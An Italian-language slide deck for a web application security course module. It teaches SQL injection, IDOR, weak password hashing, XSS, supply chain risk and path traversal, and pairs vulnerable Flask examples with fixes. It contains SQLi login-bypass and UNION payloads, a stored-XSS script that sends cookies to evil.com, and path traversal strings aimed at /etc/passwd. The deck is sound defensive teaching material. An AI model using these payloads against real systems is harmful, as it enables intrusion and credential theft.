---
title: "M6 — Sicurezza delle Applicazioni Web"
subtitle: "Corso ITS Cybersecurity (32h)"
author: "Ing. Alessandro Manneschi"
date: "ITS Prodigi · ITS Empoli · SS4I"
---

# M6 — Sicurezza Applicazioni Web
## 9 ore — 3h teoria + 6h lab (cuore del corso)

## Obiettivi

- OWASP Top 10:2025
- CVE/CVSS
- Le 5 vulnerabilità web più diffuse:
  1. SQL Injection
  2. IDOR
  3. Crypto Failures
  4. XSS
  5. Path Traversal
- + Supply Chain (pip-audit)

## Mappa del modulo (9h)

| Tempo | Argomento |
|-------|-----------|
| 1h | OWASP + CVE/CVSS |
| 2h | SQL Injection |
| 1,5h | IDOR / Broken Access Control |
| 1,5h | Password & crittografia |
| 1,5h | XSS |
| 0,5h | Supply Chain |
| 1h | Path Traversal |

## OWASP — chi sono

- **Open Web Application Security Project**
- No-profit fondata 2001
- Top 10 aggiornata ogni ~3 anni
- Tool gratuiti (ZAP, Dependency-Check, ASVS)

## OWASP Top 10:2021 (riferimento)

A01 Broken Access Control
A02 Cryptographic Failures
A03 Injection
A04 Insecure Design
A05 Security Misconfiguration
A06 Vulnerable Components
A07 Auth Failures
A08 Software & Data Integrity
A09 Logging & Monitoring
A10 SSRF

## CVE — Common Vulnerabilities and Exposures

- Identificatore univoco: `CVE-AAAA-NNNNN`
- Database: NVD (nvd.nist.gov)
- Esempi celebri: CVE-2014-0160 (Heartbleed), CVE-2021-44228 (Log4Shell)

## CVSS 3.1 — bande

| Range | Severity |
|-------|----------|
| 0.0 | None |
| 0.1–3.9 | Low |
| 4.0–6.9 | Medium |
| 7.0–8.9 | High |
| **9.0–10.0** | **Critical** |

## CVSS — Vector string

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

- AV (Attack Vector): N=Network
- AC (Complexity): L=Low
- PR (Privileges): N=None
- UI (Interaction): N=None
- S (Scope): C=Changed
- C/I/A: H=High

→ **10.0 Critical** (es. Log4Shell)

# SQL Injection (M6.2)

## Il problema

```python
# 🚩 VULNERABILE
sql = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(sql)
```

L'attaccante invia `user_id = 1 OR 1=1` → query diventa `SELECT * FROM users WHERE id = 1 OR 1=1`.

## Login bypass classico

```sql
email: ' OR '1'='1
password: qualunque
```

Query risultante:
```sql
SELECT id FROM users WHERE email = '' OR '1'='1' AND password = 'qualunque'
```

→ Login senza conoscere la password.

## UNION-based extraction

```sql
' UNION SELECT username, password, NULL FROM users --
```

→ Estrai TUTTI gli username/password da una colonna ignara.

## Difesa — query parametrizzate

```python
# ✅ SICURO
cursor.execute(
    "SELECT * FROM users WHERE id = ?",
    (user_id,)
)

# ✅ ORM (preferito)
user = User.query.filter_by(id=user_id).first()
```

> Il driver tratta il `?` come **dato**, non struttura. Mai più SQLi.

## Errore comune — filtrare gli apici

```python
# 🚩 NON BASTA
email = email.replace("'", "")
```

L'attaccante usa encoding, commenti, `\'` → bypass.
**Solo le query parametrizzate sono robuste**.

## Difese stratificate

- ✅ Query parametrizzate (sempre)
- ✅ ORM
- ✅ Least privilege per l'utente DB
- ✅ Errori generici al client
- ✅ WAF
- ✅ Logging pattern sospetti

# Broken Access Control / IDOR (M6.3)

## Auth vs Authz

| | Authentication | Authorization |
|---|---------------|---------------|
| Domanda | "Chi sei?" | "Cosa puoi fare?" |
| Quando | Login | Ogni request |
| Esempio | email+pwd | `user.id == fattura.owner_id` |

## IDOR — esempio classico

```python
# 🚩 Manca controllo proprietario
@app.route("/fattura/<int:fid>")
def fattura(fid):
    f = Fattura.query.get(fid)
    return render_template("fattura.html", fattura=f)
```

Attacco: cambia URL `/fattura/42` → `/fattura/43` → vedo fatture altrui.

## IDOR su PUT/DELETE — peggio

- `PUT /fattura/43` → modifico quella di un altro
- `DELETE /fattura/43` → cancello quella di un altro
- `POST /fattura {owner_id: 43}` → creo a nome di un altro

## Difesa — ownership check

```python
# ✅ Filter by owner direttamente
@app.route("/fattura/<int:fid>")
@login_required
def fattura(fid):
    f = Fattura.query.filter_by(
        id=fid,
        owner_id=session["user_id"]
    ).first_or_404()
    return render_template("fattura.html", fattura=f)
```

## Status code: 401 vs 403 vs 404

- **401** → non autenticato (manca login)
- **403** → autenticato ma non autorizzato
- **404** → la risorsa non esiste

> Per IDOR: **403** (non 404 — confonderebbe info).

## Errore comune — security by obscurity

❌ "Nascondo gli ID nell'UI, l'attaccante non li conosce."

L'attaccante li trova lo stesso (DevTools, log, brute force).
La difesa è **server-side**, sempre.

# Cryptographic Failures (M6.4)

## Encoding ≠ Hashing ≠ Encryption

| | Reversibile? | Uso |
|---|---|---|
| **Encoding** (Base64) | Sì (banale) | Trasporto |
| **Encryption** (AES) | Sì (con chiave) | Confidenzialità |
| **Hashing** (bcrypt) | No | Password |

> Base64 **non è cifratura**.

## Perché MD5/SHA-1/SHA-256 NON vanno per password

- MD5/SHA-1: **collisioni note**, **veloci** su GPU
- SHA-256: troppo veloce (miliardi/sec su hardware moderno)
- Senza salt: **rainbow table** banali

## bcrypt

```python
import bcrypt

# Hash
h = bcrypt.hashpw(pwd.encode(), bcrypt.gensalt(rounds=12))

# Verify
ok = bcrypt.checkpw(pwd.encode(), h)
```

- Work factor configurabile (12 ≈ 250ms)
- Salt automatico
- Standard de facto

## Argon2id

```python
from argon2 import PasswordHasher
ph = PasswordHasher()

h = ph.hash("segreta")
ph.verify(h, "segreta")  # raise se sbagliata
```

- Più moderno (vincitore PHC 2015)
- Resistenza GPU + ASIC
- Da preferire per nuove app

## Diagnosi visiva nel DB

| Cosa vedi | Diagnosi |
|-----------|----------|
| `mariopwd` | 🔥 In chiaro |
| `5f4dcc3b...` (32 hex) | MD5 (morto) |
| `5baa61e4...` (40 hex) | SHA-1 (morto) |
| `e3b0c44...` (64 hex) | SHA-256 senza salt |
| `$2b$12$...` | bcrypt ✅ |
| `$argon2id$...` | Argon2id ✅ |

# Cross-Site Scripting (M6.5)

## I 3 tipi di XSS

- **Reflected**: payload nell'URL, riflesso nella pagina
- **Stored**: payload salvato nel DB, mostrato a chi visita
- **DOM-based**: manipolazione client-side via JS

## Esempio Stored XSS

```python
# 🚩 Template Jinja2 con |safe
<p>{{ commento | safe }}</p>
```

Attaccante posta:
```html
<script>
fetch('https://evil.com/log?c='+document.cookie)
</script>
```

→ ogni visitatore della pagina **invia il proprio cookie** all'attaccante.

## Difesa — escape dell'output

Jinja2 fa escape **di default**:

```html
<!-- ✅ SICURO (default) -->
<p>{{ commento }}</p>

<!-- 🚩 PERICOLOSO -->
<p>{{ commento | safe }}</p>
```

> Non disabilitare `escape` su input utente. Mai.

## CSP — la difesa stratificata

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'
```

- Anche con XSS payload, browser non esegue
- Difesa **complementare** (non sostitutiva) all'escape

## Cookie HttpOnly

```
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax
```

Anche se XSS riesce, non può rubare il cookie di sessione.

## Difese stratificate XSS

- ✅ Escape output (Jinja2 default)
- ✅ CSP restrittiva
- ✅ Cookie HttpOnly
- ✅ Sanitizzazione input (per input HTML voluto: `bleach`)
- ✅ X-Content-Type-Options: nosniff

# Supply Chain (M6.6)

## La superficie di attacco

- **CVE in dipendenze** (caso più comune)
- **Typosquatting** (`reqeusts` invece di `requests`)
- **Dependency confusion** (npm interno vs pubblico)
- **Compromise build pipeline** (SolarWinds)

## pip-audit

```bash
pip install pip-audit
pip-audit -r requirements.txt
```

Output:
```
Found 3 known vulnerabilities in 2 packages
flask    2.0.0    GHSA-m2qf-... → 2.2.5
pyyaml   5.1      GHSA-6757-... → 5.4
```

## Caso XZ Utils 2024

- CVE-2024-3094, CVSS 10.0
- Backdoor inserita da un manutentore "ostile"
- Scoperta per caso prima dello scollamento massivo
- **Lezione**: sicurezza supply chain è il rischio più crescente del 2020s

## SBOM

> Software Bill of Materials — lista completa di tutte le dipendenze del prodotto

Formati: CycloneDX, SPDX

Sarà obbligatorio per **CRA dal 2027**.

# Path Traversal (M6.7)

## Il problema

```python
# 🚩 Vulnerabile
@app.route("/download")
def download():
    filename = request.args.get("file")
    return send_file(f"./uploads/{filename}")
```

Attacco: `?file=../../etc/passwd` → leggo file fuori dalla cartella.

## Bypass tipici

```
../etc/passwd
....//....//etc/passwd        # bypass filtro ../
..%2f..%2fetc%2fpasswd          # URL-encoded
..\\Windows\\System32\\drivers\\etc\\hosts   # Windows
```

## Difesa — 3 controlli obbligatori

```python
import os
UPLOAD_DIR = os.path.realpath("./uploads")
ALLOWED_EXTS = {".pdf", ".jpg"}

# 1) Whitelist nome (no separatori)
if "/" in fn or "\\" in fn or fn.startswith("."): abort(400)

# 2) Whitelist estensione
if os.path.splitext(fn)[1].lower() not in ALLOWED_EXTS: abort(400)

# 3) realpath + startswith
full = os.path.realpath(os.path.join(UPLOAD_DIR, fn))
if not full.startswith(UPLOAD_DIR + os.sep): abort(403)
```

## Mapping OWASP ↔ CWE ↔ GDPR

| OWASP | CWE | GDPR | Sanzione |
|-------|-----|------|----------|
| A01 IDOR | 639 | 32 | 20M€ |
| A02 Crypto | 327, 916 | 32(1)(a) | 20M€ |
| A03 SQLi | 89 | 32 | 20M€ |
| A03 XSS | 79 | 32 | 20M€ |
| A06 Components | 1104 | 32 | 20M€ |
| Path Traversal | 22 | 32 | 20M€ |

## Checklist M6

- [ ] Riconosci SQLi nel codice
- [ ] Sai sfruttarla con `' OR '1'='1`
- [ ] Sai correggerla con `?`
- [ ] Riconosci IDOR (URL con ID)
- [ ] Aggiungi ownership check
- [ ] Migri SHA-1 → bcrypt
- [ ] Riconosci 3 tipi di XSS
- [ ] Esegui pip-audit
- [ ] Difendi /download da `../`

## Errori da evitare

- ❌ "Filtro gli apici, sono al sicuro da SQLi"
- ❌ Hide ID in UI = difesa da IDOR
- ❌ MD5 + salt = OK per password (no, troppo veloce)
- ❌ Disabilitare escape Jinja2 con `|safe`
- ❌ "Il mio endpoint admin è nascosto"

## Prossimo modulo

**M7 — Lab Integrato (2h)**

Sai cercare e correggere. Adesso fallo su BancaPiccola completa.
